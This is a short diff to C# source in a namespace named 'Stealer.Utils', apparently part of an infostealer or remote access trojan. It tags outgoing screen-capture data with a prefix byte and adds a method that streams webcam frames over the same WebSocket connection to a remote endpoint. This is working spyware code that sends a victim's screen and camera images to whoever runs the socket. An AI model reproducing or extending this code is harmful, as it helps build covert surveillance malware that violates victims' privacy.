@@ -117,7 +117,23 @@ namespace Stealer.Utils
             lock (_sendLock)
             {
                 if (_ws == null || _ws.State != WebSocketState.Open) return;
-                _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Binary, true, CancellationToken.None)
+                byte[] payload = new byte[data.Length + 1];
+                payload[0] = 0x53; // 'S' for Screen
+                Buffer.BlockCopy(data, 0, payload, 1, data.Length);
+                _ws.SendAsync(new ArraySegment<byte>(payload), WebSocketMessageType.Binary, true, CancellationToken.None)
+                    .GetAwaiter().GetResult();
+            }
+        }
+
+        public static void SendCameraBinary(byte[] data)
+        {
+            lock (_sendLock)
+            {
+                if (_ws == null || _ws.State != WebSocketState.Open) return;
+                byte[] payload = new byte[data.Length + 1];
+                payload[0] = 0x43; // 'C' for Camera
+                Buffer.BlockCopy(data, 0, payload, 1, data.Length);
+                _ws.SendAsync(new ArraySegment<byte>(payload), WebSocketMessageType.Binary, true, CancellationToken.None)
                     .GetAwaiter().GetResult();
             }
         }
